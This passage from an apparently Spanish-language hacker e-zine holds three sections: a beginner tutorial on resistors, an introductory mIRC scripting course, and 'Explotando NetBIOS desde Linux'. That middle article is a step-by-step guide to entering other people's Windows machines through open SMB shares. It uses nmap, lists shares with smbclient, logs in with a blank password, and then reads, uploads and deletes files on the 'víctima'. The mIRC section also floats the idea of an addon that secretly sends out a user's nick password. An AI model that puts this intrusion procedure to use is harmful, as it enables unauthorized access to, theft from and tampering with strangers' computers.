                  |        ------      |  s=seccion 
                  |          s         |  L=largo en metros 
                  |____________________| 
 
 
normalmente la temperatura produce un aumento en la resistencia 
de un conductor 
 
para ciertas aplicaciones se fabrican resistencias que tienen cierto 
comportamiento frente a la temperatura, este es el caso de las "resistencias 
no lineales" ej:-NTC:La cual tiene una gran resistividad en temperaturas 
frias. 
                -PTC:La cual su mayor resistencia se produce cuando su 
temperatura aumenta con el paso de la corriente. 
                -VDR:Disminuye su resistencia al ser aplicado un "peak" o 
golpe de tension en sus extremos 
                -LDR:Estas resistencias dependen del voltaje y de la luz 
en esta ultima su valor resistivo depende de la luz que caiga sobre una 
de sus caras en la oscuridad su valor es elevado disminuyendo paulatinamente 
a medida que reciba mas luz 
 
Y QUE RESISTENCIAS SE USAN 
 
hay dos tipos de resistencias existentes(que yo sepa) las de alambre y las 
de carbon. Las de alambre se usan en corrientes elevadas y las de carbon 
en corrientes debiles 
 
y como le ases para saber de cuantos ohms es una resistencia 
 
R: depende si la resistencia es europea o americana(las mas tipicas) 
en las europeas se puede leer esto por ejemplo: 
                      _____ 
                   --| 1k5 |--   = 1.500 ohms 
                      ----- 
 
pero en las americanas se complica un poco mas ya que estan escritas en codigo 
                      ______________ 
                   --| || || ||     |-- =   que?????????? 
                      -------------- 
                        |  |  | 
                        |  |   ----amarillo 
                        |   -----naranjo 
                        -----gris 
 
 
 
esto se ve de la siguiente manera 
 
 
         __________________________________________ 
        | color     primer  segundo   ceros a      | 
        |           digito  digito     a¤adir      | 
        |                                          | 
        | negro       -        0          -        | 
        | cafe        1        1          0        | 
        | rojo        2        2         00        | 
        | naranjo     3        3         000       | 
        | amarillo    4        4         0000      | 
        | verde       5        5        00000      | 
        | azul        6        6        000000     | 
        | violeta     7        7       0000000     | 
        | gris        8        8       00000000    | 
        | blanco      9        9      000000000    | 
        -------------------------------------------- 
 
por lo cual podemos deducir que que???????? = 830.000 ohms 
 
¨Como cresta monto la resistencia? 
 
Bueno las resistencias las podemos montar de tres formas: - en serie  
                                                          - paralelas 
                                                          - mixtas 
veamos las resistencias en serie 
                         ________          ______ 
        (-)     --------|________|--------|______|---- 
                          r1                 r2       | 
                                                      | 
                                                      | 
                                                      | 
                                                      | 
                                                      | 
                                                      | 
        (+)     ______________________________________| 
 
 
tan facil como colocarlas una en una y ¨como calculamos el numero de 
resistencia total? r1 + r2 = rt ejemplo r1= 2 ohms y r2= 3 ohms entonces 
2 ohms + 3 ohms = 5 ohms ¨sera muy dificil? entonces anda a 1ero basico 
a que te ense¤en a sumar (plop) 
 
resistencias en paralelo 
 
        (-) ------------------------------------------ 
                                |                     | 
                                |                     | 
                               | |                   | | 
                               | |                   | | 
                             r1| |                 r2| | 
                               |_|                   |_| 
                                |                     | 
         (+) ___________________|_____________________| 
 
 
como se sacan los valores de estas resistencias bueno ehh ADIVINA 
 
                          r1 x r2        ej       6 x 5   30  
                          --   --  = Rt  -->      -   - = -- = 2,72... ohms 
                          r1 + r2                 6 + 5   11 
 
 
¨Y por que? bueno piensa que la electricidad ahora va por dos caminos 
y no por un solo trayecto por lo cual la conductancia del circuito aumenta 
 
ojo se hace el mismo procedimiento si pasa lo siguiente 
                         ____ 
                    |---|____|---| 
                    |            | 
        ------------|    ____    |----------- 
                    |---|____|---| 
 
 
Montajes Mixtos : bueno eso te lo dejo a tu imaginacion ya que es una 
combinacion de los 2 anteriores 
                          
-Otra cosa- que pasaria con el siguiente caso tenemos una ampolleta que 
trabaja a 3 amp pero el circuito trabaja a 10 amp obviamente abria un 
sobreexeso de tension lo cual no nos combendria para nuestro circuito 
por lo cual por asi decirlo direccionamos loa amperios a una resistencia 
veamos(en edit) el siguiente esquema.  
               ___ 
              ( _ ) ampolleta (3amp) 
22V   (-) -----|_|----------------- 
10amp       |   __   |            |       tenemos que mandar los 7 amperes 
            |--|__|--|            |       que nos sobran a la resistencia 
                R1                |       para calcular de cuanto es la 
                                  |       resistencia que nesesitamos  
                                  |       tenemos que sacarlo del siguiente  
     (+)  ________________________|       modo  
 
                                                R= V/amp que no usa la  
                                                         ampolleta 
 
 
 en este caso se dice que hay una resistencia "shunt" 
 
 
los voy a dejar con tarea (tarea pa mi tambien jejeje) calculen el valor ohmnico del siguiente 
circuito 
 
                 
              ________                          _____ 
(-)    ------|________|-------------------------|___|---------- 
                r1                 |             r4           | 
                                   |                       r5| | 
                                -------                      | | 
                               | |    | |                    |_| 
                             r2| |  r3| |                     | 
                               |_|    |_|                    | | 
                                --------        ___        r6| | 
                                   |         |-|___|-|       |_| 
                                   |         |   r7  |        | 
(+)    --------------------------------------|       |--------| 
                                             | ____  | 
r1 = 23 ohms                                 |-|___|-| 
r2 = 35 ohms                                     r8 
r3 = 60 ohms 
r4 = 55 ohms 
5r = 12 ohms 
r6 = 34 ohms 
r7 = 26 ohms 
 
(respuesta en el proximo numero jajaja no al final de la e-zine va a 
estar eso creo) 



====================================================================== 
= 0x05 =============================================================== 
====================================================================== 
====================================================================== 


		################################## 
		# Explotando NetBIOS desde Linux #  
		#                                # 
		# DrAk0        www.hven.com.ve   # 
		##################################    
 
  Bueno  gente  aqui  va  mi  primer  articulo para el e-zine asi que me 
  disculpan  lo sencillo que pueda estar pero argo si les digo, FUNCIONA 
  MUY BIEN ;) y eso es lo importante... 
 
  Este  doc  lo  hago  porque  mas  de una vez estaba en un canal de IRC 
  chateando  de  lo  mas  normal y me decian: "¨pana estas en windows?". 
  ¨para que?  -decia yo-  Para que te metas en tal pc porque yo estoy en 
  Linux, el  tiene  el 139 abierto .... -entonces yo decia- , ¨pero que? 
  ¨desde  linux  no se puede?... ­y saben que!. SI, si se puede y eso es 
  lo que vamos a hacer ahora mismo :-). 
 
  Lo   primero   que   debemos   tener   es   bien  configurado  nuestro 
  /etc/smb.conf. Bueno  la  idea es que lo podamos entrar en esa maquina 
  ya  asi  que les pongo un modelo de smb.conf aqui, pero les recomiendo 
  que  se  lean  el  SAMBA-HOWTO  para  que  lo  pongan  al  pelo  a  su 
  preferencia... 
 
----CUT---- 
 [global] 
 workgroup = erguamache.com 
   server string = Linux Power >;) 
;   hosts allow = 192.168.1. 192.168.2. 127. 
   log file = /var/log/samba.%m 
   max log size = 50 
   security = user 
;   password server = <NT-Server-Name> 
;  encrypt passwords = yes 
;   include = /usr/local/samba/lib/smb.conf.%m 
   socket options = TCP_NODELAY 
;   interfaces = 192.168.12.2/24 192.168.13.2/24 
;   local master = no 
;   os level = 33 
;   domain master = yes 
;   preferred master = yes 
;   domain controller = <NT-Domain-Controller-SMBName> 
;   domain logons = yes 
;   logon script = %m.bat 
;   logon script = %U.bat 
;   logon path = \\%L\Profiles\%U 
;   wins support = yes 
;   wins server = w.x.y.z 
;   wins proxy = yes 
   dns proxy = no 
[homes] 
   comment = Home Directories 
   browseable = no 
   writable = yes 
 
; [netlogon] 
;   comment = Network Logon Service 
;   path = /usr/local/samba/lib/netlogon 
;   guest ok = yes 
;   writable = no 
;   share modes = no 
 
   guest ok = no 
   writable = no 
   printable = yes 
 
;[tmp] 
;   comment = Temporary file space 
;   path = /tmp 
;   read only = no 
;   public = yes 
 
;[public] 
;   comment = Public Stuff 
;   path = /home/samba 
;   public = yes 
;   writable = yes 
;   printable = no 
;   write list = @staff 
 
;[fredsprn] 
;   comment = Fred's Printer 
;   valid users = fred 
;   path = /homes/fred 
;   printer = freds_printer 
;   public = no 
;   writable = no 
;   printable = yes 
 
;[fredsdir] 
;   comment = Fred's Service 
;   path = /usr/somewhere/private 
;   valid users = fred 
;   public = no 
;   writable = yes 
;   printable = no 
;[pchome] 
;  comment = PC Directories 
;  path = /usr/pc/%m 
;  public = no 
;  writable = yes 
;[public] 
;   path = /usr/somewhere/else/public 
;   public = yes 
;   only guest = yes 
;   writable = yes 
;[myshare] 
;   comment = Mary's and Fred's stuff 
;   path = /usr/somewhere/shared 
;   valid users = mary fred 
;   public = no 
;   writable = yes 
;   printable = no 
;   create mask = 0765 
----CUT---- 
 
  Si  crees  que  no  tienes  bien tu smb.conf comparalo con este si no, 
  bueno  ya  sabes, cut  paste, OJO aqui si piensas poner a funcionar el 
  smb.conf  para  tu red pues este no te va a servir, bueno por lo menos 
  las impresoras... 
 
  Ya  sabes SAMBA-HOWTO contigo... bueno una vez teniendo en smb.conf en 
  buen  estado  pues buscamos a ver si tenemos el smbclient que va a ser 
  nuestra arma, probamos de la siguiente manera... 
 
  Escribimos esto en una shell: 
 
--------------------- 
linuxserver:~# smbclient -L 1 
Added interface ip=192.168.1.1 bcast=192.168.1.255 nmask=255.255.255.0 
error connecting to 0.0.0.1:139 (Network is unreachable) 
Connection to 1 failed 
linuxserver:~#         
--------------------- 
 
  Si  esto  nos  aparece, estamos  listos, si  no  bueno  ve buscando en 
  internet el smbclient a ver si lo encuentras ;)... 
 
  Bueno  ahora  si  ya  que sabemos que tenemos todo lo que necesitamos, 
  manos a la obra. Ok. 
 
1.- Por supuesto tener la IP de la PC a la cual queremos entrar 
2.- A~adimos  esa IP a nuestro archivo /etc/hosts de la siguiente manera 
    pueden usar cualquier editor de texto mi preferencia es vi. 
    a~adimos asi: 
 
---- 
127.0.0.1	localhost 
192.168.1.1	 	linuxserver.sagitario.org linuxserver 
xxx.xxx.xxx.xx          el.dominio.loquesea   sualiasqui 
#ejemplo real 
192.168.1.2             resp.sagitario.org resp 
---- 
 
  Ojo... el dominio lo podemos agarrar de la la siguiente manera, usando 
  nuestro querido amigo NMAP haciendole un scan a nuestra IP amiga ;) 
 
  Asi de esta forma: 
 
--- 
linuxserver:~# nmap -sS -O  192.168.1.2 
  
Starting nmap V. 2.02 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/) 
Interesting ports on resp.sagitario.org (192.168.1.2): 
Port    State       Protocol  Service 
139     open        tcp        netbios-ssn 
  
TCP Sequence Prediction: Class=trivial time dependency 
                         Difficulty=1 (Trivial joke) 
Remote operating system guess: Windows NT4 / Win95 / Win98 
  
Nmap run completed -- 1 IP address (1 host up) scanned in 11 seconds 
linuxserver:~#                                                        
--- 
 
  Como  podemos  ver  en  la  segunda  linea  nos aparece el dominio que 
  buscamos Interesting ports on -->resp.sagitario.org<--- (192.168.1.2): 
  y  asi  vemos  que  efectivamente tiene su netbios abiertico solo para 
  nosotros Bueno eso esperamos. 
 
3.- Una  vez  teniendo  el  archivo  /etc/hosts  definido  con la ip que 
    queremos probamos si esta correcto de la siguiente forma: 
 
ping resp (es decir ping elalias ;)) 
 
  Deberiamos obtener algo como esto: 
 
--- 
linuxserver:~# ping resp 
PING  victima.sagitario.org (192.168.1.1): 56 data bytes 
64 bytes from 192.168.1.1: icmp_seq=0 ttl=255 time=0.7 ms 
64 bytes from 192.168.1.1: icmp_seq=1 ttl=255 time=0.5 ms 
64 bytes from 192.168.1.1: icmp_seq=2 ttl=255 time=0.5 ms   
--- 
 
  Bueno si nos sale esto ya estamos seguro que la victima esta alli y la 
  tenemos en la mira jeje... 
 
4.- Ahora  nos  toca ver que es lo que esta compartiendo esa maquina que 
    queremos agarrar haciendo lo siguiente. 
 
smbclient -L aliasvictima 
 
  Esto nos dira que comparte la victima. 
  Al  principio  nos  pedira  un  password y le daremos enter, eso no nos 
  detiene. 
 
--- 
linuxserver:~# smbclient -L resp 
Added interface ip=192.168.1.1 bcast=192.168.1.255 nmask=255.255.255.0 
Password: 
  
        Sharename      Type      Comment 
        ---------      ----      ------- 
        C              Disk 
        IPC$           IPC       Comunicacion remota entre procesos 
  
        Server               Comment 
        ---------            ------- 
  
        Workgroup            Master 
        ---------            ------- 
linuxserver:~#             
--- 
 
  Aqui vemos que comparte C: justamente lo que estabamos buscando >;)  
 
  Lo  unico  que  tenemos que ligar ahora es que no tenga password, y si 
  lo tiene nos  judimus, pero si tenemos ese pass lo podemos usar . 
 
  Bueno esperemos que no tenga pass... Si es asi lo que nos que hacer es 
  probarlo tratando de entrar haciendo esto: 
 
smbclient \\\\lamaquina\\elrecurso 
 
  En  este  caso  la  maquina  es  resp y el recurso es C como lo mostre 
  anteriormente: 
 
--- 
linuxserver:~# smbclient \\\\resp\\c 
Added interface ip=192.168.1.1 bcast=192.168.1.255 nmask=255.255.255.0 
Password:          
--- 
 
  En este  punto  nos  pide un password, pues todavia tenemos esperanzas 
  si esta maquina no tiene asegurado su recurso con password (lo cual es 
  un  error fatal)  bastara con darle un simple enter y deberiamos estar 
  adentro. 
 
--- 
linuxserver:~# smbclient \\\\resp\\c 
Added interface ip=192.168.1.1 bcast=192.168.1.255 nmask=255.255.255.0 
Password:[enteraqui] 
smb: \>   
--- 
 
  Este  prompt  "smb: \>" nos  quiere decir que ESTAMOS ADENTRO SI!!! lo 
  penetramos. YEAH!! 
 
  Y si  no  es  que  tiene un  pass, y si lo  tenemos solo se lo ponemos 
  cuando lo pida, y si no lo tienes busca como agarrarlo ;). 
 
........... 
 
  Bueno ya adentro. 
 
  En este  prompt  "smb: \>"  bastara  con  darles  los comandos que nos 
  interesen. 
 
  Aqui  les  anexo  los comandos  que  mas usaremos, si quieres mas pues 
  busca ;): 
 
ls = listar los archivos y directorios 
get = traer un archivo de esa maquina 
put = subir (meter) un archivo para esa maquina 
rm = borrar archivo 
rename = renombrar  
pwd = saber en que carpeta estas 
mkdir = crear carpeta 
rmdir = borrar carpeta 
h = ayuda (muy importante jejejeje) 
 
 
  Bueno  con  eso  les  dejo  las  herramientas para  que  puedan seguir 
  disfrutando  del  poder  de LINUX y no tener que pasarte para win para 
  explotar el Netbios. 
 
  Espero que les sirva de algo, pues a mi si que me servido... 
 
  Y queria  darle  las  gracias al pana Supreme, pues el es el que me ha 
  empujado y  me  ha  ayudado estimulandome con Linux y el hack desde el 
  principio, jeje cuando era mas lamer que Bilo puf que horrible... pero 
  bueno  gracias a Dios que ya sali de alli, tambien ar pana Combel, por 
  sus  asesorias y  consejos. Y tambien  las gracias der pana [C]apon[E] 
  por toda  su  colaboracion  y por permitir  que lo  penetrara, juy (su 
  maquina) no jeje para todas estas pruebas... bueno se despide.. 
 
DrAk0 der Valle 
DrAk0@unete.com  
ICQ UIN# 52211219 
Linux.Counter.  
# 158165. 



====================================================================== 
= 0x06 =============================================================== 
====================================================================== 
====================================================================== 



                                                  /* Scripting para mIRC */ 
                                                                /* Sanot */   
 
Holas. Bueno, antes que todo quiero decir dos cosas.  
1.- Este curso esta destinado a mIRC, pero lo que aqui se aprende se puede escibir 
en otros como Pirch. En el caso de otras plataformas (como Linux) tambien se
pueden utilizar pero eso lo veremos a fondo mas adelante.   
2.- El scripting (de IRC) se aplica a un conjunto de rutinas establecidas para un 
cliente con el fin que favoresca o no al usuario. Por ejemplo, los addons, yo
puedo bajar (o hacer) un addon que me proteja contra los deop, eso lo hace
algo que me favorece bastante, pero tambien puedo hacer un addon con un codigo
secreto en donde este me envie un mensaje diciendome la clave del nick.
(Interesante no?)     Muchos de los que estan leyendo esto estan conectados
este momento al IRC. Y podria apostar que mas del 40% de estos quieren hacer
algo bueno con el scripting. Pero el hacer un addon o un script no es cosa
facil, lleva tiempo, muchas veces aburre y varias coasas que no voi a seguir
diciendo (despues no van a querer leer el articulo) para esto necesitan
conocer los comandos del IRC y sus definiciones, aqui tienen una lista.       
                          -Comandos-  
/ame [texto de acción] .:Envia Accion a todos los canales:.  
/amsg [texto] .:Comando que envia texto a todos los canales:.  
/away [mensaje](opcional) .:al hacerlo por primera vez nos pone Away:.  
/away .:Si lo hacemos por segunda vez nos sacara el away:.  
/ban [#canal] [nick] .:Pone un ban a un nick (prohibicion de entrada):. 
/channel .:Muestra la consola del canal (Modos, Topico, Bans):.  
/clear .:Borra todo lo escrito en un canal:.  
/clearall .:Lo mismo que /clear pero en TODAS las ventanas:.  
/ctcp [nick] PING .:Muestra el lag de un determinado nick:.  
/ctcp [nick] FINGER .:Muestra informacion de un usuario:.  
/ctcp [nick] VERSION .:Muestra el cliente de irc que usa el usuario:.  
/ctcp [nick] TIME .:Muestra la hora segun el reloj interno de la persona:. 
/closemsg [nick] .:Cierra la ventana query con el nick especificado:.  
/creq ASK .:Hace que se te pregunte al momento que te hacen un Dcc Chat:. 
/creq AUTO .:Recive automaticamente todos los Dcc Chat que te envien:.  
/creq IGNORE .:Ignora todos los dcc Chat:.  
/dcc SEND [nick] [Archivo] .:Envia por DCC archivo(s) a un nick:.  
/dcc CHAT [nick] .:Abre una ventana dcc chat al nick:.  
/describe [canal] [acción] .:Envia acccion a un canal:.  
/disconnect .:Fuerza la desconexión inmediata desde el servidor de IRC:. 
/dns [nick|IP] .:Resuelve direccion IP:.  
/echo [nick|#canal|estado|activo][texto] .:Muestra texto en lugar señalado:. 
 /exit .:Fuerza al mIRC a desconectar y cerrra el cliente:.  
/font .:Muestra la ventana de seleccion de Letras:.  
/help [palabra] .:Abre archivo de ayuda (del mIRC) y la muestra:.  
/ignore [on | off | nick] .:Ignora a nick o direccion totalmenete:.  
/invite [nick] [#canal] .:Invita otro usuario al canal:.  
/join [canal] .:Entra al canal señalado:.  
/kick [canal] [nick] .:Patea(saca) al nick de un cana especifico:. 
 /list [cadena] .:Busca Lista de todos los canales:.  
/load [- modos] [Archivo] .:Carga archivos al mIRC:.  
/log [on | off] .:Graba o termina de grabar la ventana actual:.  
/me [Accion] .:Envia una accion a la ventana activa:.  
/mode [#canal | nick] +/- modos .:Coloca modos a usuario o canal:.  
/msg [canal |nick] [mensaje] .:Envia mensaje a nick o canal:.  
/names [canal] .:Muesta la lista de nicks en un canal:.  
/nick [nuevo nick] .:Cambia de nick:.  
/notice [nick] [mensaje] .:Envia una noticia a un nick:.  
/notify [on | off | nick] .:Activa o no la notificasion de nicks conectados:.  
/onotice [canal] [mensaje] .:Manda un notice a los operadores del canal:.  
/omsg [canal] [mensaje] .:Manda un msg a los operadores de un canal:.  
/part [canal] [Mensaje] .:Hace salir del canal especificado:. 
/partall .:Te hace salir de todos los canales que estás:.  
/query [nick][mensaje] .:Abre una ventana al usuario y envía el mensaje:. 
 /quit [razón] .:Desconecta del IRC con un msg optativo:.  
/remote [on | off] .:Activa o no los remotes:.  
/run [directorio] .:Ejecuta el programa especificado:.  
/say [texto] .:Muestra el texto en la ventana activa:.  
/server [servidor][puerto][contraseña]] .:Conecta a un servidor:.  
/time .:Cuenta el tiempo en el servidor utilizado:.  
/timer[N°] [repeticiones][intervalo en seg] [comando] .:Repite comandos:. 
 /topic [canal] [Topic] .:Cambia/Setea el topic de un canal:.  
/whois [nick] .:Muestra informacion de un nick:.  
/whowas [nick] .:Información del nick que se cambio en el IRC:.     
Bueno, estos son los comandos que saque de la pagina del mIRC en español,
recuerden que existen mas comandos y estos varian segun su cliente de IRC.    
Supongo que muchos quedaron con dudas acerca de palabras. Aqui os expongo un
pequeño glosario. En cada edicion pondre mas palabras
                         
        -Glosario-                    

-Addon: Rutina que se se escribe en uno o mas archivos, este se ejecuta en el
Cliente de irc, cumple una o varias funciones.    

-Away: Ausencia se usa cuando estas ocupado(a)    

-Bot: Es como un script, su base se situa en los remotes, este actua solo
(como un roBOT) y tienen varias funciones (divertir, protejer canales, atacar
canales, etc)     

-Canal: Su nombre comienza con # (ej. #Syst4t_Team) en el se
situan los usuarios, aqui se puede hablar publicamente a todos los que esten
en este.    

-EggDrop: Bot escrito en lenguaje C que se usa en sistemas de
plataforma UNIX  estos al igual que los bot trabajan solos y cumplen varias
funciones.    

-IRCop: un IRCOP (ircoperator) es como un policia dentro de la
red. Encargado de velar por que las reglas de esta se cumplan.    

-Lag: Retrado que existe entre lo que se escribe y lo que demora en llegar a
los otros.    

-Op(@): Operador, tiene mas privilegio que los demas usuarios en
el canal.    

-Plageo: En este topico (no es topíco) hablamos de plageo cuando
un usuario copia el trabajo de alguien y lo modifica para darse propios
creditos.    

-Script: Un script es un conjunto de rutinas que se escriben en
el cliente de IRC. Es como un conjunto de varios addons que hacen diferenetes
cosas.    

-Scripter: Persona comun y corriente que scriptea (simple no?)   

-Voice(+): Tiene la posibilidad de hablar junto con los operadores si el canal
esta moderado.     

Bueno, hasta aqui estamos con los comandos y definiciones, pero aun hai mas;
Un script se compone de 4 partes principales que son los Aliases, los Popups,
los Remotes y las Variables. Comensaremos con lo mas basico que son los
Aliases                             

                        ****ALIASES****    

Aliases: Los aliases se escriben en los aliases del cliente (que obvio no?)
(si estas con mIRC preciona Alt +A) Como el nombre lo dice son Alias, es decir
formas cortas de decir algo. Doi un ejemplo, todos sabemos que para entrar a
un canal debemos tipear /join #canal, entonces si yo siempre entro al canal
#Syst4t_team y me da una paja escribir siempre /join #Syst4t_team puedo usar
un aliases, Su sintaxis para usarlo es /alias /comando(s). Si yo quiero que al
escribir /syst4t entre al canal debo poner en los aliases                     

   /syst4t /join #Syst4t_Team  

ahora si quiero usar varios comandos debo hacer lo mismo pero añadirle otras
cosas, por ejemplo yo escribi escribi en los aliases
          /entrar_canales /join #syst4t_team | /join #chile | /join #Krime  

con eso si yo escribo /entrar_canales voi a entrar a #Syst4t_team a #chile y a
#krime al mismo tiempo... Otro ejemplo, yo quiero desconectarme siempre con el
mensaje Chao Amig@s.. ya regreso (sabemos que debo scribir /quit Chao Amig@s..
ya regreso) pero eso es muy largo y me demoro mucho entonces solo escribo en
mis aliases               
/chao /quit Chao Amig@s.. ya regreso  Simple no??? 
  
Advertencia: Te recomiendo que hagas esto sin un script, ya que el script ya
esta hecho y si le añades cosas puede causar conflico con las que ya tiene y
hacerte pasar un mal rato.      
Recuerda que el nombre que le das al alias (lo que escribes para ejecutar el
comando) debe comensar con "/" al igual que el del comando. NO IMPORTA EL
NOMBRE QUE LE DES, es decir el nombre del alias no influye en el comando.    
Bueno, una vez que esten aqui ya deberan entender como hacer un aliases si no
entienden leanlo de nuevo o consulten en algun canal como #IRCAyuda (en el
caso de DALnet).     
Esa es la base de los aliases, pero aun ahi mas; para hacer mas interactivo
el scripting se han creadoi un conjunto de strings, algo asi como variables
que cumplen una sola funcion, aqui va una lista (solo pondre algunas, mas
adelante podran ver mas).                                      
$+       =
Junta strings con textos, numeros, etc
$time    = Hora segun nuestro computador            
$date    = Fecha segun nuestro computador            
$me      = Nuestro nick 
$server  = El servidor por wl qe estamos conectados            
$ip      = Nuestra IP            
$chan    = Canal Activo            
$vnick   = Nick al que se ha dado voice            
$onick   = Nick al que se ha dado OP            
$knick   = Nick al que cual se ha pateado            
$mircdir = Directorio donde tenemos el mIRC32/16.exe            
$1       = Representa a lo primero            
$2       = Representa a lo segundo            
$3       = Representa a lo tercero     (de los argumentos)

Bueno, con esto ya podemos crear unas variables mas interactivas, veamos
algunos ejemplos.     
/Hora /echo -s Son las $time    
Que hace esto? Simple, al escribir /Hora le pide al mIRC que imprima en la
ventana de estado ( -s ) el texto   Son las XX:XX:XX ( Ej. Son las 18:52:35 ) 
    
Veamos otro.  
/Ip_todos /amsg Mi IP es =$IP=     
Esto manda un mensaje a todos los canales donde estoi ( /amsg ) diciendoles
Mi Ip es =xxx.xx.xx.xxx=   Ohh..... error, no lo dice bien, no manda mi IP...
por que?????    Simple,  esto ocurre por que se produce un conflicto entre los
= y $IP. Como deberia ser el comando entonces? 
/Ip_todos /amsg Mi IP es = $+ $IP $+ =  
OK! Ahora si, si observan bien veran que $+ junto los "=" con mi numero IP. 
   Bueno, una vez que esten aqui ya deberan comprender bien el uso de los
aliases, de lo contrario... Lean de nuevo Xp
                              
                         ****FIN ALIASES****    

Bueno, como habran visto los aliases nos sirven cuando queremos hacer atajos
de comandos. Ustedes pueden adecuar esto tambien a los servicios de su nick
(Por ejemplo en el caso de DALnet, podrian hacer algo como              
/Identificar /nickserv identify *****                 
(**** representa su clave)   
Bueno, eso lo dejo a su imaginacion, con el scripting pueden hacer todo!     

                           ****POPUS****     

Bueno, ya sabemos como usar los aliases, sabemos que si no queremos escribir
algo tan largo usamos un popus, solo escribimos un comando. Pero que tal si en
vez de escribir un solo comando solo hacemos un click con el mouse. Seria
lindo no? pero no se puede hasta la version 8.8 del mIRC, por lo que dejamos
hasta aqui este articulo...                                                   
                 Sanot      
Hehehe... no, es broma, claro que se puede, esto es mas facil que los popus
pero debemos tener un poco mas orden.     
Para accesder a los popus deben mantener Alt y precionar P (Alt + P). Bueno,
exolicaremos que hay vastantes tipos de popus.    -MenuBar: Es el menu que
esta arriva.  

-NickList: Lista que aparese al hacer click con el mouse en un nick. 
-Query/Chat: Menu flotante que aparece en los privados  
-Channel: Menu que aparece en en los canales  -Status: Es el menu flotante
que esta en la ventana de Estado.    

Los popus ejecutan comandos que pueden ser aliases o comandos ahi mismo
descritos. 
Veamos un ejemplo    
Ver  
.Hora:/hora  .Fecha:/echo -s Estamos a $date $+ .  
.Ip:/echo -a Mi IP es $IP  
.Servidor:/echo -a El servidor es $server  

  Bueno, que muestra esto, al hacer click con esto, nos va a salir el cuadrito
VER y una flechita a la derecha, al pocisionarnos en el cuadro nos va a tirar
un sub-menu que dice   
*Hora (usa el aliases que creamos anteriormente) 
*Fecha (Imprime en el estatus la fecha y un punto seguido de este al final) 
*IP (Imprime en la ventana activa el texto mi Ip es seguido de nuestra UP) 
*Servidor (Imprime en el estatus el servidor en que estamos)    
Bueno, parece dificil pero no lo es. Veamos otros ejemplos   
Canales 
.Chilenos 
..#Chile:/join #chile 
..#Chile+:/join #Chile+ 
..#santiago:/join #santiago 
.Hack 
..#Syst4t_team:/join #syst4t_team 
..#Hackermundo:/join #hackersmundo 
..#hackersespaña:/join #hackersespaña 
.Varios 
..#Computador:/join #computador 
..#ircayuda:/join #ircayuda 
..#DALnetAyuda:/join #dalnetayuda 
 
 Bueno, esto nos muestra un cuadro que dice Canales y un submenu que dice 
*Chilenos 
*Hack 
*Varios 
 Y a la vez estos tienen otro submenu con varios canales. 
 
 recuerden que ustedes pueden adecuar estos menus a donde ustedes quieran. 
 
 Voi a dar algunas ideas para: 
 
*MenuBar: 
 
 Syst4t 
Conectar 
.DALnet 
..Twisted:/server twisted.ma.us.dal.net 
..Global:/server global.dal.net 
..- 
..irc:/server irc.dal.net 
.Chilenos 
..Terra:/server irc.terra.cl 
..mIRC:/server www.mirc.cl 
..ELSitio 
...ChatX:/server chatx.elsitio.com 
...IRC:/server irc.elsitio.com 
- 
Entrar 
.Chile:/join #chile 
.Syst4t_team:/join #syst4t_team 
.- 
.Otro:/join $?="Canal:" 
- 
Cambiar Nick 
.CaeSpcok:/nick CaeSpock 
.Taz:/nick Taz 
.Otro:/nick $?="Tipea el Nick" 
 
 Uff, bueno, que tenemos aqui, vamos por parte. 
Syst4t= Se ve en las opciones, generalmente aqui va el nombre del script. 
 
Conectar 
.DALnet 
..Twisted:/server twisted.ma.us.dal.net 
..Global:/server global.dal.net 
..- 
..irc:/server irc.dal.net 
.Chilenos 
..Terra:/server irc.terra.cl 
..mIRC:/server www.mirc.cl 
..ELSitio 
...ChatX:/server chatx.elsitio.com 
...IRC:/server irc.elsitio.com 
- 
 
 Bueno, esto nos da la lista Conectar y nos entrega varios servidores para 
elegir, si ven sale ..- < Esto hace una separacion (una linea) entre Global e
irc, ideal para separar cosas de interes con las basicas. TB tenemos el - que
separa Conectar y Entrar.     

Entrar 
.Chile:/join #chile 
.Syst4t_team:/join #syst4t_team 
.- 
.Otro:/join $?="Canal:" 
- 
                 
Esto nos da la posibilidad de entrar en canales. Aqui tenemos un nuevo string, 
el $?="" Esto nos muestra un cuadro de peticion donde (en este caso) dice
Canal: y al escribir algo va a entrar ahi. Se puede usar con   /server
$?="Servidor:" o lo que ustedes quieran.                                      

            Cambiar Nick 
.CaeSpcok:/nick CaeSpock 
.Taz:/nick Taz 
.Otro:/nick $?="Tipea el Nick" 
 
Bueno, aqui nos da la posibilidad de cambiar de nick a CaeSpock, Ta o el que 
ustedes quieran. 
 
Esto del MenuBar tambien lo pueden usar para status, ya que cumplen una funcion 
no muy diferente. 
 
 
*NickList: 
 
Quien es:/whois $1 
IP:/dns $1 
- 
Control 
.Op 
..Dar:/mode # +o $1 
..Quitar:/mode # -o $1 
.Voice 
..Dar:/mode # +v $1 
..Quitar:/mode # -v $1 
.- 
Patear:/kick $chan $1 $?="Razon" 
Banear:/mode # +b $1 
CTCP 
.Ping:/ctcp $1 ping 
.Version:/ctcp $1 version 
.Time:/ctcp $1 time 
DCC 
.Send:/dcc send $1 
.Chat:/dcc chat $1 
 
 
 Ok, aqui tenemos el menu de nicks. 
 
Quien es:/whois $1 
IP:/dns $1 
 
Aqui tenemos dos cosas nuevas, una es el whois que ve la informacion de la 
persona. Pero que es el $1. El $1 (para que entiendan) representa a lo que
hablamos, es decir si estamos hablando de hacer un whois a Monitor hablamos de
/whois $1 donde $1 representa a Monitor.     
Control 
.Op 
..Dar:/mode # +o $1 
..Quitar:/mode # -o $1 
.Voice 
..Dar:/mode # +v $1 
..Quitar:/mode # -v $1 
.- 
Patear:/kick $chan $1 $?="Razon" 
Banear:/mode # +b $1 
 
Aqui tenemos el control, (solo operadores) donde se nos permite dar @, dar +, 
patear y banear. Si recordamos el comando para dar voice seria  

        /mode #canal +v nick (ej. /mode #syst4t_team +v Konejo

aqui tenemos "/mode # +v $1" donde # representa al canal activo, y $1 al nick 
del cual estamos hablando. 
 
CTCP 
.Ping:/ctcp $1 ping 
.Version:/ctcp $1 version 
.Time:/ctcp $1 time 
DCC 
.Send:/dcc send $1 
.Chat:/dcc chat $1 
 
Aqui tenemos un CTCP (Ping, Version y Time) donde reprsentamos  
           "/ctcp $1 <tipo ctcp>" O /ctcp nick <tipo ctcp> 
y DCC Send y Chat "/dcc <tipo dcc> $1" o /dcc <tipo dcc> nick 
 
                  
Bueno amigos, aqui tenemos ya una explicasion casi conclusa acerca de los popus, 
en nuestra proxima seccion los veremos mas a fondo, veremos los remotes las
variables y varias cosas mas de bastante interes   

                                                      Sanot





====================================================================== 
= 0x07 =============================================================== 
====================================================================== 
